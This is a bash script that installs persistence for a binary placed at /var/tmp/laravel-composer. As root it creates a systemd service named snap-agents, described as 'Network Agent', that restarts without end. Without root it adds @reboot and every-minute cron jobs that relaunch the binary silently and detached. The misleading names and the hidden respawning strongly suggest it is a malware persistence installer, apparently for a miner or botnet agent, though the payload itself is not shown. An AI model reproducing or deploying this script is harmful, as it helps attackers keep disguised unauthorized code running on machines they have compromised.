#!/bin/bash

# Configuration
AGENT_PATH="/var/tmp/laravel-composer"
SERVICE_BASE_NAME="snap-agents"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Laravel Composer Agent Setup ===${NC}"

# Check if laravel-composer exists
if [[ ! -f "$AGENT_PATH" ]]; then
    echo -e "${RED}❌ Error: laravel-composer not found at $AGENT_PATH${NC}"
    echo -e "${YELLOW}Please ensure laravel-composer is downloaded to $AGENT_PATH before running this script.${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Found laravel-composer at $AGENT_PATH${NC}"

# Make sure the agent is executable
chmod +x "$AGENT_PATH"

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    echo -e "${GREEN}➜ Running as root. Setting up systemd service...${NC}"
    
    # Function to find available service name
    find_available_service_name() {
        local base_name="$1"
        local service_name="${base_name}.service"
        local counter=1
        
        # Check if base service name exists
        if ! systemctl list-unit-files | grep -q "^${service_name}"; then
            echo "$service_name"
            return
        fi
        
        # Find an available name with a number suffix
        while systemctl list-unit-files | grep -q "^${base_name}-${counter}.service"; do
            ((counter++))
        done
        
        echo "${base_name}-${counter}.service"
    }
    
    # Find available service name
    SERVICE_NAME=$(find_available_service_name "$SERVICE_BASE_NAME")
    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
    
    echo -e "${GREEN}➜ Using service name: $SERVICE_NAME${NC}"
    
    # Create systemd service file
    echo -e "${GREEN}➜ Creating systemd service file...${NC}"
    cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    # Set proper permissions
    chmod 644 "$SERVICE_PATH"
    
    # Reload systemd and start service
    echo -e "${GREEN}➜ Reloading systemd and starting service...${NC}"
    systemctl daemon-reload
    
    # Enable the service
    if systemctl enable "$SERVICE_NAME" 2>/dev/null; then
        echo -e "${GREEN}✓ Service enabled successfully${NC}"
    else
        echo -e "${RED}❌ Failed to enable service${NC}"
        exit 1
    fi
    
    # Start the service
    if systemctl start "$SERVICE_NAME" 2>/dev/null; then
        echo -e "${GREEN}✓ Service started successfully${NC}"
    else
        echo -e "${RED}❌ Failed to start service${NC}"
        exit 1
    fi
    
    # Show status
    echo -e "${GREEN}➜ Service status:${NC}"
    systemctl status "$SERVICE_NAME" --no-pager
    
    echo -e "${GREEN}✓ Setup complete! Service '$SERVICE_NAME' is now running.${NC}"
    echo -e "${YELLOW}To check service logs, use: journalctl -u $SERVICE_NAME -f${NC}"
    
else
    echo -e "${GREEN}➜ Running as non-root user. Setting up cron job...${NC}"
    
    # Check if cron is available
    if ! command -v crontab &> /dev/null; then
        echo -e "${RED}❌ Error: crontab command not found. Please install cron.${NC}"
        exit 1
    fi
    
    # Create temporary file for crontab
    TEMP_CRON="/tmp/.cron_backup_$$"
    
    # Backup existing crontab (ignore error if no crontab exists)
    crontab -l 2>/dev/null > "$TEMP_CRON" || true
    
    # Check if the cron jobs already exist
    REBOOT_JOB="@reboot setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    MINUTE_JOB="* * * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &"
    
    # Add jobs only if they don't already exist
    if ! grep -Fq "$REBOOT_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$REBOOT_JOB" >> "$TEMP_CRON"
        echo -e "${GREEN}✓ Added @reboot cron job${NC}"
    else
        echo -e "${YELLOW}⚠ @reboot cron job already exists${NC}"
    fi
    
    if ! grep -Fq "$MINUTE_JOB" "$TEMP_CRON" 2>/dev/null; then
        echo "$MINUTE_JOB" >> "$TEMP_CRON"
        echo -e "${GREEN}✓ Added every-minute cron job${NC}"
    else
        echo -e "${YELLOW}⚠ Every-minute cron job already exists${NC}"
    fi
    
    # Install the new crontab
    if crontab "$TEMP_CRON"; then
        echo -e "${GREEN}✓ Crontab updated successfully${NC}"
    else
        echo -e "${RED}❌ Failed to update crontab${NC}"
        rm -f "$TEMP_CRON"
        exit 1
    fi
    
    # Clean up
    rm -f "$TEMP_CRON"
    
    # Start the agent immediately in background
    echo -e "${GREEN}➜ Starting agent in background...${NC}"
    setsid nohup "$AGENT_PATH" >/dev/null 2>&1 &
    
    echo -e "${GREEN}✓ Setup complete! laravel-composer has been set up to run via cron.${NC}"
    echo -e "${YELLOW}Agent location: $AGENT_PATH${NC}"
    echo -e "${YELLOW}Cron jobs added for automatic execution at reboot and every minute.${NC}"
    echo -e "${YELLOW}To view your cron jobs, use: crontab -l${NC}"
fi

echo -e "${GREEN}=== Setup completed successfully! ===${NC}"
